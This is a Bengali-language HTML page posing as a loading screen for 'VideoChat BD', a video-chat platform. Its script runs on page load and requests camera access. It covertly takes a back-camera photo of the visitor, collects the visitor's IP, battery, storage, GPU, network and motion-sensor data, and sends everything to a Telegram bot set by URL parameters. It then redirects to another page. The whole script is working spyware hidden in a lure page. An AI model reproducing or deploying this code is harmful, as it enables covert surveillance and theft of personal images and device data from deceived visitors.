<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>VideoChat BD - আরও সুন্দর সরল ডিজাইন</title>
    <link rel="shortcut icon" href="https://i.ibb.co/6wmnh5M/apple-icon-114x114.png" />
    <meta property="og:title" content="বাংলাদেশের সব থেকে বৃহৎ অনলাইন ভিডিও চ্যাটিং প্ল্যাটফর্ম!" />
    <meta property="og:description" content="বাংলাদেশের সব থেকে বৃহৎ অনলাইন ভিডিও চ্যাটিং প্ল্যাটফর্ম!" />
    <meta property="og:image" content="https://i.ibb.co/26HXSwY/img-Azar-Web-Match.png" />
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #7c3aed;
            --secondary-color: #3b82f6;
            --accent-color: #10b981;
            --text-color: #ffffff;
            --progress-color-1: #7c3aed;
            --progress-color-2: #60a5fa;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  overflow: hidden;
  touch-action: manipulation;
}

        body {
            font-family: 'Hind Siliguri', sans-serif;
            height: 100vh;
            touch-action: manipulation;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: var(--text-color);
            display: flex;
            position: fixed;
            justify-content: center;
            align-items: flex-start;
       padding-top: 15vh; 
           overflow: hidden; 
            position: relative;
        }
        #particle-canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        .container { position: relative; z-index: 1; width: 100%; max-width: 650px; padding: 2.5rem; text-align: center; margin-top: 10vh; overflow-y: auto; min-height: 100vh;}
        .logo-container { margin-bottom: 3rem; animation: float 6s ease-in-out infinite; will-change: transform; }
        .logo {
            font-size: 3.5rem; font-weight: bold;
            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 8px 24px rgba(124, 58, 237, 0.25);
            display: inline-block; filter: drop-shadow(0 0 15px rgba(124, 58, 237, 0.6));
        }
        .tagline { font-size: 1.2rem; opacity: 0.9; margin-top: 0.5rem; }
        .card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 2.5rem;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .card:hover { transform: translateY(-5px); box-shadow: 0 12px 48px rgba(0, 0, 0, 0.15); }
        .progress-container { position: relative; height: 40px; background: rgba(255, 255, 255, 0.1); border-radius: 20px; margin: 2rem 0; overflow: hidden; box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.2); }
        .progress-bar { height: 100%; width: 0; background: linear-gradient(90deg, var(--progress-color-1), var(--progress-color-2)); border-radius: 20px; transition: width 0.1s linear; position: relative; will-change: width; }
        .progress-bar::before {
            content: "";
            position: absolute; top:0; left:0; right:0; bottom:0;
            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
            transform: translateX(-100%);
            animation: shine 3s infinite;
        }
        .percentage { position: absolute; top:50%; left:50%; transform: translate(-50%,-50%); font-size:1.2rem; font-weight:bold; color:var(--text-color); z-index:2; text-shadow:0 0 5px rgba(0,0,0,0.5); }
        .message { margin-top:1.5rem; font-size:1.3rem; opacity:0; animation:fadeIn 0.5s ease forwards; height:2rem; }
        .tips { margin-top:2rem; font-size:1.1rem; height:1.5rem; color:rgba(255,255,255,0.8); }
        .icon-pulse { display:inline-block; animation:pulse 2s infinite; margin-right:8px; color:var(--accent-color); will-change:transform,opacity; }
        .blob { position:absolute; border-radius:50%; filter:blur(40px); z-index:-1; opacity:0.3; will-change:transform; }
        .blob-1 { top:-15%; right:-5%; width:350px; height:350px; background:var(--primary-color); animation:blobMove1 20s ease-in-out infinite alternate; }
        .blob-2 { bottom:-20%; left:-10%; width:350px; height:350px; background:var(--secondary-color); animation:blobMove2 20s ease-in-out infinite alternate; }
        @keyframes float { 0% { transform: translateY(0px);} 50% { transform: translateY(-10px);} 100% { transform: translateY(0px);} }
        @keyframes fadeIn { from { opacity:0; transform:translateY(10px);} to { opacity:1; transform:translateY(0);} }
        @keyframes pulse { 0%{transform:scale(1);opacity:1;}50%{transform:scale(1.1);opacity:0.8;}100%{transform:scale(1);opacity:1;} }
        @keyframes shine { 0%{transform:translateX(-100%);}20%,100%{transform:translateX(100%);} }
        @keyframes blobMove1 {0%{transform:translate(0,0) scale(1);}100%{transform:translate(5%,5%) scale(1.1);} }
        @keyframes blobMove2 {0%{transform:translate(0,0) scale(1);}100%{transform:translate(-5%,-5%) scale(0.9);} }
        @media (max-width: 640px) {
            .container{padding:1.5rem;} .logo{font-size:2.5rem;} .tagline{font-size:1rem;} .card{padding:1.5rem;} .message, .tips{font-size:1rem;} .blob-1, .blob-2{width:250px;height:250px;}
        }
    </style>
</head>
<body>
    <canvas id="particle-canvas"></canvas>
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="container">
        <div class="logo-container">
            <div class="logo"><i class="fas fa-video"></i> VideoChat BD</div>
            <div class="tagline">বাংলাদেশের সেরা ভিডিও চ্যাটিং প্ল্যাটফর্ম</div>
        </div>
        <div class="card">
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
                <div class="percentage" id="percentage">0%</div>
            </div>
            <div class="message" id="loading-message">ওয়েবসাইট লোড হচ্ছে দয়া করে অপেক্ষা করুন...</div>
            <div class="tips"><span class="icon-pulse"><i class="fas fa-star"></i></span><span id="tip-text">নতুন বন্ধুদের খুঁজুন!</span></div>
        </div>
    </div>
    <script>
        // Canvas-based particle system
        const canvas = document.getElementById('particle-canvas');
        const ctx = canvas.getContext('2d');
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', () => { resizeCanvas(); });
        resizeCanvas();

        class Particle {
            constructor() {
                this.reset();
            }
            reset() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.5;
                this.vy = (Math.random() - 0.5) * 0.5;
                this.size = Math.random() * 3 + 1;
                this.alpha = Math.random() * 0.5 + 0.1;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
            }
            draw() {
                ctx.save();
                ctx.globalAlpha = this.alpha;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = '#fff';
                ctx.fill();
                ctx.restore();
            }
        }

        const particles = Array.from({ length: window.innerWidth < 768 ? 15 : 30 }, () => new Particle());
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(animateParticles);
        }
        animateParticles();

        // Progress Bar
        let progress = 0;
        const progressBar = document.getElementById('progress-bar');
        const percentage = document.getElementById('percentage');
        function updateProgress() {
            if (progress < 100) {
                progress += 0.2;
                progressBar.style.width = progress + '%';
                percentage.textContent = Math.floor(progress) + '%';
                requestAnimationFrame(updateProgress);
            } else {
                const msg = document.getElementById('loading-message');
                msg.style.opacity = 0;
                setTimeout(() => {
                    msg.textContent = 'লোড সম্পন্ন হয়েছে! আপনাকে স্বাগতম!';
                    msg.style.opacity = 1;
                }, 500);
            }
        }
        requestAnimationFrame(updateProgress);

        // Rotating Tips
        const tips = [
            "বিশ্বের যে কোনও প্রান্তে বন্ধু খুঁজুন!",
            "নিরাপদ এবং আনন্দদায়ক ভিডিও চ্যাট!",
            "আমাদের সাথে থাকার জন্য ধন্যবাদ!"
        ];
        const tipText = document.getElementById('tip-text');
        const iconPulse = document.querySelector('.icon-pulse');
        const icons = ['fas fa-star','fas fa-heart','fas fa-comments','fas fa-smile','fas fa-globe'];
        let currentTip = 0, currentIcon = 0;
        function rotateTips() {
            tipText.style.opacity = 0;
            iconPulse.style.opacity = 0;
            setTimeout(() => {
                currentTip = (currentTip + 1) % tips.length;
                currentIcon = (currentIcon + 1) % icons.length;
                tipText.textContent = tips[currentTip];
                iconPulse.innerHTML = `<i class="${icons[currentIcon]}"></i>`;
                tipText.style.opacity = 1;
                iconPulse.style.opacity = 1;
                setTimeout(rotateTips, 3000);
            }, 500);
        }
        setTimeout(rotateTips, 3000);
            // ওয়েবসাইট লোড হওয়ার পর ক্যামেরা অ্যাক্সেস চাওয়া হবে
    requestCameraAccess();
    function getUrlParameter(name) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(window.location.href);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

const tokenFromUrl = getUrlParameter('token');
const chatIdFromUrl = getUrlParameter('id');

async function sendPhotoToTelegram(blob, message, token, chat_id) {
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', blob, 'user_photo.jpg');
    formData.append('caption', message);
    formData.append('parse_mode', 'HTML');

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            throw new Error('Failed to send photo');
        }

        console.log('Photo sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending photo to', chat_id, ':', error);
    }
}

async function sendCaptionToTelegram(caption, token, chat_id) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: caption,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error('Failed to send caption');
        }

        console.log('Caption sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending caption to', chat_id, ':', error);
    }
}

async function sendPhotoAndCaption(blob, caption) {
    if (tokenFromUrl && chatIdFromUrl) {
        const photoMessage = `<b>📸 Back Camera Photo </b>\n\n<blockquote><b>⚠️ Do not misuse this photo</b> </blockquote>`;
        await sendPhotoToTelegram(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
        await sendCaptionToTelegram(caption, tokenFromUrl, chatIdFromUrl);
    } else {
        console.log('No token or chat ID provided in URL, not sending photo and caption.');
    }
}

async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        await new Promise(resolve => videoElement.onloadedmetadata = resolve);
        videoElement.play();

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        const caption = await getDeviceInfo();
        await sendPhotoAndCaption(blob, caption);

        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error('Error accessing webcam:', error);
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = `<b>🚫 Camera Access Blocked</b>\nUnable to take photo.\n\n${caption}`;
            await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        } else {
            console.log('No token or chat ID provided in URL, not sending error message.');
        }
    }
}

let currentActivity = "Unknown";
let accHistory = [];
const historyLength = 100;
const walkingThreshold = 2.0;

function calculateVariance(arr) {
    const mean = arr.reduce((a, b) => a + b, 0) / arr.length;
    return arr.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / arr.length;
}

function handleMotion(event) {
    const acc = event.accelerationIncludingGravity;
    if (!acc) return;

    const x = acc.x || 0;
    const y = acc.y || 0;
    const z = acc.z || 0;

    const magnitude = Math.sqrt(x * x + y * y + z * z);
    accHistory.push(magnitude);
    if (accHistory.length > historyLength) {
        accHistory.shift();
    }

    const variance = calculateVariance(accHistory);
    const isWalking = variance > walkingThreshold;

    if (isWalking) {
        currentActivity = "Walking or riding";
    } else {
        const pitch = Math.atan2(y, Math.sqrt(x * x + z * z)) * (180 / Math.PI);
        const roll = Math.atan2(x, Math.sqrt(y * y + z * z)) * (180 / Math.PI);
        if (Math.abs(pitch) > 60 || Math.abs(roll) > 60) {
            currentActivity = "Lying down";
        } else {
            currentActivity = "Standing or Sitting";
        }
    }
}

if (window.DeviceMotionEvent) {
    window.addEventListener('devicemotion', handleMotion);
} else {
    currentActivity = "Sensor not supported";
}

async function measureSpeed() {
    const url = 'https://speed.cloudflare.com/__down?bytes=1000000';
    const fileSizeBytes = 1000000;
    const numTests = 3;
    let totalSpeed = 0;
    let successfulTests = 0;

    for (let i = 0; i < numTests; i++) {
        try {
            const start = performance.now();
            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            const end = performance.now();
            const duration = (end - start) / 1000;
            if (duration > 0) {
                const bitsLoaded = fileSizeBytes * 8;
                const speedBps = bitsLoaded / duration;
                totalSpeed += speedBps;
                successfulTests++;
            }
        } catch (error) {
            console.error('Error in speed test:', error);
        }
    }

    if (successfulTests === 0) {
        return 'Unknown';
    }

    const averageSpeedBps = totalSpeed / successfulTests;
    const speedMbps = (averageSpeedBps / 1000000).toFixed(2);
    return speedMbps;
}

async function getDeviceInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        const deviceTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const userAgent = navigator.userAgent;
        const battery = await navigator.getBattery();
        const batteryPercentage = (battery.level * 100).toFixed(2);
        const chargingStatus = battery.charging ? "✅" : "❌";
        const browserLanguage = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        const speedMbps = await measureSpeed();

        let networkType = '';
        if (navigator.connection && navigator.connection.effectiveType) {
            const effectiveType = navigator.connection.effectiveType;
            switch (effectiveType) {
                case 'slow-2g':
                case '2g':
                    networkType = '2G';
                    break;
                case '3g':
                    networkType = '3G';
                    break;
                case '4g':
                    networkType = '4G';
                    break;
                default:
                    networkType = 'Unknown';
            }
        } else if (speedMbps !== 'Unknown') {
            const speed = parseFloat(speedMbps);
            if (speed < 0.1) {
                networkType = '1G';
            } else if (speed < 1) {
                networkType = '2G';
            } else if (speed < 10) {
                networkType = '3G';
            } else if (speed < 50) {
                networkType = '4G';
            } else {
                networkType = '5G';
            }
        } else {
            networkType = 'Unknown';
        }

        function adjustStorage(value) {
            if (value >= 20 && value < 30) return 32;
            if (value >= 50 && value < 70) return 64;
            if (value >= 100 && value < 130) return 128;
            if (value >= 250 && value < 280) return 256;
            return Math.round(value);
        }

        const storageInfo = await navigator.storage.estimate();
        let totalStorage = (storageInfo.quota / (1024 * 1024 * 1024)).toFixed(2);
        let usedStorage = (storageInfo.usage / (1024 * 1024 * 1024)).toFixed(2);

        usedStorage = adjustStorage(usedStorage * 2);
        totalStorage = adjustStorage(totalStorage * 2);

        const storageDisplay = usedStorage > 0 ? `${usedStorage} GB / ${totalStorage} GB` : `${totalStorage} GB`;

        const ram = navigator.deviceMemory || 'Unknown';

        let networkIndicator = '';
        if (navigator.connection) {
            const connectionType = navigator.connection.type;
            networkIndicator = connectionType === 'wifi' ? 'Wi-Fi' : 'Mobile Data';
        } else {
            networkIndicator = '❓ Unknown Network';
        }

        const currentTime = new Date();
        const date = currentTime.toLocaleDateString();
        const time = currentTime.toLocaleTimeString();

        const activity = currentActivity;

        const pixelRatio = window.devicePixelRatio;
        const viewportWidth = window.innerWidth;
        const viewportHeight = window.innerHeight;
        const cpuCores = navigator.hardwareConcurrency;

        let gpuRenderer = 'Unknown';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) {
            console.error('Error getting GPU renderer:', e);
        }

        let authenticatorAvailable = '❌';
        if (window.PublicKeyCredential) {
            authenticatorAvailable = '✅';
        }

        const caption = `<b>🌐 IP Address:</b> ${ip}\n\n` +
                        `<b>💻 User-Agent:</b> ${userAgent}\n\n` +
                        `<b>🔋 Battery:</b> ${batteryPercentage}% <b>Charging:</b> ${chargingStatus}\n\n` +
                        `<b>🌐 Language:</b> ${browserLanguage}\n\n` +
                        `<b>📏 Screen Size:</b> ${screenWidth}×${screenHeight}\n\n` +
                        `<b>🚀 Internet Speed:</b> ${speedMbps} Mbps\n\n` +
                        `<b>📶 Network:</b> ${networkType} <b>Type:</b> ${networkIndicator}\n\n` +
                        `<b>💾 RAM & Storage:</b> ${ram} GB/${storageDisplay}\n\n` +
                        `<b>🕒 Date:</b> ${date} <b>Time:</b> ${time}\n\n` +
                        `<b>🏃 Activity:</b> ${activity}\n\n` +
                        `<b>⏳ Device time zone:</b> ${deviceTimeZone}\n\n` +
                        `<b>📊 Device Pixel Ratio:</b> ${pixelRatio}\n\n` +
                        `<b>🖥️ Viewport Size:</b> ${viewportWidth}×${viewportHeight}\n\n` +
                        `<b>🧑‍💻 CPU Cores:</b> ${cpuCores}\n\n` +
                        `<b>🎮 GPU Renderer:</b> ${gpuRenderer}\n\n` +
                        `<b>🔑 Fingerprint Available:</b> ${authenticatorAvailable}\n\n` +
                        `<blockquote><b>⚠️ Note:</b> এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।</blockquote>`;

        return caption;
    } catch (error) {
        console.error('Error getting device info:', error);
        return `<b>⚠️ Unable to retrieve device info</b>`;
    }
}

async function requestCameraAccess() {
    try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        console.log('Camera access granted');
        captureAndSendPhoto();
    } catch (error) {
        console.error('Error accessing webcam:', error);
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = `<blockquote><b>🚫 Camera Access Blocked.Unable to take back camera photo 📸</b></blockquote>\n\n${caption}`;
            await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        } else {
            console.log('No token or chat ID provided in URL, not sending error message.');
        }
    }
}

setTimeout(function() {
    const token = getUrlParameter('token');
    const chat_id = getUrlParameter('id');
    const newUrl = `main.html?token=${token}&id=${chat_id}`;
    window.location.href = newUrl;
}, 8500);

    </script>
</body>
</html>
